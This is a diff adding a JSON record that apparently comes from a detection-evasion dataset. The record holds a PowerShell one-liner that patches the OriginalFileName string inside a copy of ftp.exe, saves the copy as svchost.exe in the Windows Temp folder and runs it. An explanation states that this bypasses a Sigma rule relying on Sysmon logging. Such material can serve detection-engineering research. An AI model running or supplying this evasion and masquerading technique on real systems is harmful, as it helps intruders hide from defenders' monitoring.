@@ -1,0 +1,6 @@
+[
+  {
+    "output": "powershell.exe -Command \"$bytes = [IO.File]::ReadAllBytes('C:\\Windows\\System32\\ftp.exe'); $target = [System.Text.Encoding]::Unicode.GetBytes('ftp.exe'); $replacement = [System.Text.Encoding]::Unicode.GetBytes('mod.exe'); for ($i = 0; $i -lt $bytes.Length - $target.Length; $i++) { $match = $true; for ($j = 0; $j -lt $target.Length; $j++) { if ($bytes[$i+$j] -ne $target[$j]) { $match = $false; break } } if ($match) { for ($j = 0; $j -lt $replacement.Length; $j++) { $bytes[$i+$j] = $replacement[$j] } } }; [IO.File]::WriteAllBytes('C:\\Windows\\Temp\\svchost.exe', $bytes); Start-Process 'C:\\Windows\\Temp\\svchost.exe'\"",
+    "explanation": "The Sigma rule explicitly relies on event logging (such as Sysmon Event ID 1) reading the 'OriginalFileName' attribute from the executable's PE header Version Info resource. By programmatically reading the binary, hex-editing/overwriting the Unicode string 'ftp.exe' to something else (like 'mod.exe'), and dropping it to disk under a disguised name, the executed binary will no longer have an OriginalFileName of 'ftp.exe', successfully bypassing the detection logic."
+  }
+]
